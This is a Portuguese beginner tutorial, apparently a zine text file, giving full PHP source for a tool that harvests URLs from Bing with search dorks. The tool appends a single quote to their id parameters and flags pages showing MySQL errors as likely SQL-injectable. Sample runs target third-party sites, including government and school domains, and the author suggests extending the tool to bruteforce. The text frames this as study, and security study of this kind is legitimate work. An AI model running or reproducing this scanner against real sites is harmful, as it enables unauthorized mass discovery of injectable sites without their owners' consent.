@@ -1,0 +1,508 @@
+
+
+          _  _             _  _
+  .       /\\/%\       .   /%\/%\     .
+      __.<\\%#//\,_       <%%#/%%\,__  .
+.    <%#/|\\%%%#///\    /^%#%%\///%#\\
+      ""/%/""\ \""//|   |/""'/ /\//"//'
+ .     L/'`   \ \  `    "   / /  ```
+        `      \ \     .   / /       .      == Automating a sqli crawler | A beginner guide ==
+ .       .      \ \       / /  .                        By Rodrigo Nasss | @n4sss 
+        .        \ \     / /          .
+   .      .    ..:\ \:::/ /:.     .     .
+______________/ \__;\___/\;_/\________________________________
+YwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYwYw
+ 
+Para deixarmos nosso crawler "intuitivo" iremos criar duas class:
+ 
+- Classe bing scan ( Um crawler para bing para podermos pegar algumas urls de modo automatizado) .
+ 
+- Classe sqli crawler ( Eis o nosso crawler que irá fazer o parse dos sites possivelmente
+vulneraveis).
+
+- E nosso arquivo principal ( main ) que invoca as duas classes para automatizar o trabalho.
+ 
+ 
+-- Conceito --
+ 
+- Quando estamos no ato do pentTest procuramos de uma forma ou outra levantar todos
+os serviços, enumerar usuários, coisas triviais no campo da S.I.
+ 
+Nesse caso iremos automatizar um scanner que irá procurar sites que se "encaixem" no nosso objetivo
+e mostrar o quão frágil é a segurança de muitos sites. É importante que sejamos conscientes em um estudo
+do tipo.
+ 
+-- Criação das classes --
+ 
+O caso será estudado utilizando PHP , que sabemos que é uma linguagem que não se encaixa no perfil de
+muitos mas que é simples para esse nosso experimento ( Em python por exemplo creio que seriam menos linhas, mas enfim haha).
+ 
+- Bing scan -
+
+Iremos deixar nossas classes distintas para que em um futuro próximo possamos incluir em um só
+arquivo para não perdemos a organização do código.
+ 
+* Estou utilizando um método de crawler oldschool no bing , dessa forma não utilizaremos api's ou coisa do tipo,
+caso queira melhorar, não há problemas, ja que estamos em caso de estudo :D
+ 
+Code:
+ 
++--------------------------------------------------------------------------------------------------------------+
+
+<?php
+ 
+/*
+* Automating a sqli crawler
+* Bing scan class
+*
+* By Rodrigo 'Nasss'
+*
+*/
+ 
+set_time_limit(0);
+error_reporting(E_ALL);
+ 
+Class BingScan {
+  /**
+   * @var string dork | dork to search on bing engine
+   */
+   var $dork;
+   /**
+    * @var int timeout | timeout connection
+    */
+   var $timeout;
+   /**
+    * @var string user_agent | user_agent behavior
+    */
+   var $user_agent;
+   /**
+    * @var string log | result
+    */
+   var $log;
+   /**
+    * @var string http_response | body response
+    */
+   var $http_response;
+   /**
+    * @var array http_info | info about request
+    */
+   var $http_info;
+   /**
+    * @var int limit_page | page limit to search
+    */
+   var $limit_page;
+   
+   function __construct($dork, $log){
+     $this->dork       = urlencode($dork);
+     $this->user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0';
+     $this->limit_page = 411; // May be more
+     $this->regex      = "#href=\"(.*?)\">#"; // Simple , would be more specific
+     $this->log        = $log;
+     $this->uri_list   = array(); // To check repeated results
+     $this->timeout    = 10;
+   }
+   
+   /**
+    * Save content
+    */
+   function save_content(){
+     foreach($this->uri_list as $uri):
+      file_put_contents($this->log, $uri."\n", FILE_APPEND);
+     endforeach;
+   }
+   
+   /**
+    * Get request on bing
+    * @param string $uri
+    */
+   function get($uri){
+     $ch = curl_init();
+     curl_setopt($ch, CURLOPT_URL, $uri);
+     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+     curl_setopt($ch, CURLOPT_USERAGENT, $this->user_agent);
+     curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:', 'Connection: close'));
+     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);
+     $this->http_response = curl_exec($ch);
+     $this->http_info     = curl_getinfo($ch);
+   }
+   
+   /**
+    * Parse uris after get request
+    */
+   function parse_uris(){
+    if(preg_match_all($this->regex, $this->http_response, $matches)):
+      foreach($matches[1] as $uri):
+        if($uri && strstr($uri, 'http://') && !preg_match('/msn|microsoft|php-brasil|facebook|4shared|bing|imasters|
+                    phpbrasil|php.net|yahoo|scriptbrasil|under-linux/', $uri) && !in_array($uri, $this->uri_list)): 
+                    
+          $uri = strstr($uri, '"', true);
+          $this->uri_list[] = $uri;
+        endif;
+      endforeach;
+    endif;
+   }
+   
+   /**
+    * Init Crawler
+    */
+   function scan(){
+    echo "Automating a sqli crawler.\n[] Bing scan module."; 
+     
+    $pointer = 1;
+    $label   = urldecode($this->dork);
+    
+    while($pointer <= $this->limit_page):
+         
+      echo "\rDork: {$label} Page: {$pointer}/411";
+      $uri  = "http://www.bing.com/search?q={$this->dork}&go=&filt=all&first={$pointer}";
+      $this->get($uri);
+       
+      // Parse uris from $this->http_response  / Aqui separamos as urls do nosso resultado ($this->http_response)
+      $this->parse_uris();
+       
+      $pointer += 10;
+        
+    endwhile;
+    
+    $this->save_content();
+   }
+}
+
+
++--------------------------------------------------------------------------------------------------------------+
+
+Agora que ja possuimos nossa classe bing , automatizaremos um check para urls que podem estar vulneraveis a sqli
+através da busca de strings que estão presentes no má tratamento de consultas sql:
+
+- Mysql_ ( De mensagens de erro e dificilmente a palavra é encontrada em uma página, a não ser que seja
+um site em especifico que se trate do assunto).
+
+- SQL ( Mesma lógica anterior, lembrando que é apenas uma palavra que vai estar na página. ).
+
+Abaixo temos funções (PHP) muito utilizadas no dia-a-dia para os mais devidos fins que são definidas
+sem o devido cuidado na entrada de dados ( endUser ). Então dessa forma "deduzimos" que quando essas "strings"
+são exibidas em uma página existe algo errado:
+
+- mysql_num_rows()
+- mysql_fetch_assoc()
+- mysql_result()
+- mysql_fetch_array()
+- mysql_numrows()
+- mysql_preg_match()
+
+Erros envolvendo essas mensagens são exibidas quando usuários
+mal intencionados manipulam um resultado final via uma requisição GET por exemplo utilizando queryString fora do padrão esperado:
+
+http://site.com/noticia.php?id=(id x)
+
+caso ouvesse uma manipulação:
+
+http://site.com/noticia.php?id=10'
+
+com uma aspa simples (') a requisição sai do comum e caso o programador não tenha
+tratado essa entrada provavelmente teremos um erro envolvendo uma ou mais das palavras acima, dessa forma
+permitindo em alguns casos : carregamento de arquivos sensiveis, execução de comandos, etc.
+
+os erros também são emitidos quando um registro é excluido do banco e a página que faz a requisição para esse registro ainda existe ali ( Perigo / Descuido do dev ).
+
+Não entrarei no contexto técnico de como uma query é executada ou como deve ser tratada, mas nada
+que um artigo futuro não possa abordar (-:.
+
+Agora podemos automatizar o crawler sqli para que o mesmo possa ser utilizado com o resultado
+do bingScan.
+
+Code:
+
++--------------------------------------------------------------------------------------------------------------+
+
+<?php
+
+/*
+* Automating a sqli crawler
+* Sqli class
+* 
+* By Rodrigo 'Nasss'
+* 
+*/
+
+set_time_limit(0);
+error_reporting(E_ALL);
+
+Class sqliCrawler{
+  /**
+   * @var string
+   */
+  var $uri_file;
+  /**
+   * @var string|regex
+   */
+  var $common_messages;
+  /**
+   * @var string
+   */
+  var $log;
+  /**
+   * @var string
+   */
+  var $user_agent;
+  /**
+   * @var int
+   */
+  var $timeout;
+  /**
+   * @var string
+   */
+  var $http_response;
+  /**
+   * @var array
+   */
+  var $uris;
+  
+  function __construct($uri_file, $log){
+    $this->uri_file        = $uri_file;
+    $this->common_messages = '/Mysql_|SQL|mysql_num_rows()|mysql_fetch_assoc()|mysql_result()|mysql_fetch_array()|mysql_numrows()|mysql_preg_match()/';
+    $this->log             = $log;
+    $this->user_agent      = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0';
+    $this->timeout         = 10;
+    $this->uris            = array();
+  }
+  
+  function get($uri){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $uri);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: close', 'Expect:'));
+    curl_setopt($ch, CURLOPT_USERAGENT, $this->user_agent);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);
+    $this->http_response = curl_exec($ch);
+  }
+  
+  /**
+   * Parse uri callback method | add ' string
+   */
+  function add_string($item){
+    if(strstr($item, '=')):
+      $this->uris[] = $item."'";
+    endif;
+  }
+  
+  /**
+   * start method
+   */
+  function crawler(){
+    echo "Automating a sqli crawler.\n[] Sqli crawler module.\n"; 
+    
+    // Prepare uris with (') to test in $this->uris
+    $tmp = array_filter(explode("\n", file_get_contents($this->uri_file)));
+    array_walk($tmp, array($this, 'add_string'));
+    
+    foreach($this->uris as $uri):
+      $this->get($uri);
+      $msg = sprintf("[-] %s\n", $uri);
+      if(preg_match($this->common_messages, $this->http_response)):
+        $msg = sprintf("[+] %s\n", $uri);
+        file_put_contents($this->log, $msg, FILE_APPEND);
+      endif;
+      
+      echo $msg;
+    endforeach;
+  }
+}
+
+
++--------------------------------------------------------------------------------------------------------------+
+
+
+Por fim podemos criar nosso arquivo principal que chama as classes criadas anteriormente em ambos os casos:
+
+Code:
+
++--------------------------------------------------------------------------------------------------------------+
+
+<?php
+
+/*
+ * Main file - Automating a sqli Crawler
+ * By Rodrigo 'Nasss'
+ * 
+ * http://n4sss.blogspot.com.br | http://janissaries.org
+ * 
+ */
+ 
+set_time_limit(0);
+error_reporting(E_ALL);
+
+// Bing / sqli class
+require 'bing.php';
+require 'sqli.php';
+
+function help($argv){
+  
+  $banner = "Automating a sqli crawler.
+  Use:
+  
+  Bing scan:
+  php {$argv[0]} -d dork -o uri_results
+  
+  Params:
+  
+  -d dork                 | dork to search into bing engine
+  -o uri_results          | results from bing
+  
+  +-------------------------------------------------------------+
+  
+  Sqli scan:
+  php {$argv[0]} -f uri_file -o output
+  
+  Params:
+  
+  -f uri_file            | File with uris to check sql message errors.
+  -o output              | Result with possible vulns.
+  
+  By Rodrigo 'N4sss' | http://janissaries.org | http://n4sss.blogspot.com.br";
+  
+  return $banner;
+}
+
+// (-d (DORK) | -o (OUTPUT)) (-f (URI FILE TO SQLI SCAN))
+$opt = getopt("d:o:f:");
+
+// Bing scan
+if(isset($opt['d'], $opt['o'])):
+  if(isset($opt['f'])) exit(help($argv));
+  $dork   = $opt['d'];
+  $output = $opt['o'];
+  $bing   = new BingScan($dork, $output);
+  $bing->scan();
+// Sqli scan
+elseif(isset($opt['f'], $opt['o'])):
+  if(isset($opt['d'])) exit(help($argv));
+  $uri_file = $opt['f'];
+  $output   = $opt['o'];
+  $sqli     = new sqliCrawler($uri_file, $output);
+  $sqli->crawler();
+else:
+  exit(help($argv));
+endif;
+
+
+
++--------------------------------------------------------------------------------------------------------------+
+
+Agora podemos separar as operações:
+
+~$ php main.php
+
+Automating a sqli crawler.
+        Use:
+
+        Bing scan:
+        php main.php -d dork -o uri_results
+
+        Params:
+
+        -d dork                 | dork to search into bing engine
+        -o uri_results          | results from bing
+
+        +-------------------------------------------------------------+
+
+        Sqli scan:
+        php main.php -f uri_file -o output
+
+        Params:
+
+        -f uri_file            | File with uris to check sql message errors
+        -o output              | Result with possible vulns.
+
+
+Ou seja:
+
+Para utilizarmos o "dorker" via bing:
+
+php main.php -d "site.php?id= palavra_qualquer" -o uri_results.txt
+
+Nesse caso podemos procurar mais de uma dork porque setamos nosso file_put_contents para um FILE_APPEND,
+dessa forma "concatenando" os resultados no arquivo especificado:
+
+~$ php main.php -d "pagina.php?id= escola" -o urls.txt
+Automating a sqli crawler.
+Dork: pagina.php?id= escola Page: 121/411
+---snip---
+
+
+e para utilizarmos o "sqli crawler" com os resultados do scan anterior:
+
+php main.php -f uri_results.txt -o possible_vulns.txt -o output
+
+Todos os resultados serão gravados no nosso arquivo chamado (sqli_vulns.txt).
+Não deixarei os nomes originais dos sites por alguns motivos claros.
+
+~$ php main.php -f urls.txt -o sqli_vulns.txt
+Automating a sqli crawler.
+[] Sqli crawler module.
+[-] http://www.fake_site.com.br/pagina.php?id=5'
+[-] http://www.fake_site_2.br/pagina.php?id=14'
+[-] http://www.fake_site.com.br/pagina.php?id=7'
+[-] http://www.fake_site.com.br/pagina.php?id=escolas'
+[+] http://www.fake_site_lica.com.br/pagina.php?id=4'
+[+] http://www.fake_site.g12.br/pagina.php?id=1'
+[-] http://www.fake_site.pt/pagina.php?id=7'
+[-] http://www.fake_site.com.br/pagina.php?id=4'
+[-] http://www.fake_site.com.br/pagina.php?id=16'
+[-] http://www.fake_site.sp.gov.br/pagina.php?id=81'
+[-] http://www.fake_sitea.sp.gov.br/pagina.php?id=81'
+[-] http://www.fake_site.com.br/pagina.php?id=16'
+[-] http://fake_site.com.br/site/pagina.php?id=1'
+[-] http://www.fake_site-al.com.br/site/pagina.php?id=6'
+---snip---
+
+Após o termino do nosso scan podemos verificar as urls encontradas ([+] possivelmente vulneraveis com nossas
+mensagens estabelecidas anteriormente) e constatar o quão é simples e rápido
+achar sites com erros que colocam em riscos dados de usuários e de sistemas importantes.
+
+Ao abrir um dos sites encontrados:
+
+Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home/priv8/www/funcoes/funcoes.php on line 192
+
+Um erro que pode ser simples mas que implica e muito na segurança.
+
+Podemos pegar como base esses dois scripts que escrevemos e automatizar muitos outros processos, seja um bruteforce
+ou até mesmo tarefas mais complexas que com a automatização diminui e muito o esforço e nos da uma vantagem
+em cima de pesquisas, seja elas quais forem. :-)
+
+
+
+Files:
+https://github.com/n4sss/sqli_crawler
+
+                        //
+                       //
+                      //
+                     //
+              _______||
+         ,-'''       ||`-.
+        (            ||   )
+        |`-..._______,..-'|
+        |            ||   |
+        |     _______||   |
+        |,-'''_ _  ~ ||`-.|
+        |  ~ / `-.\ ,-'\ ~|
+        |`-...___/___,..-'|
+        |    `-./-'_ \/_| |
+        | -'  ~~     || -.|
+   jrei (   ~      ~   ~~ )
+         `-..._______,..-'
+Texto simples, mas fica ai a reflexão gafanhotos!
+[]'s
+
+Sites:
+http://janissaries.org
+http://n4sss.blogspot.com.br
+
+Twt:
+@n4sss
+
+Contact:
+proclnas[at]gmail[dot]com
+
+By Rodrigo 'Nasss'
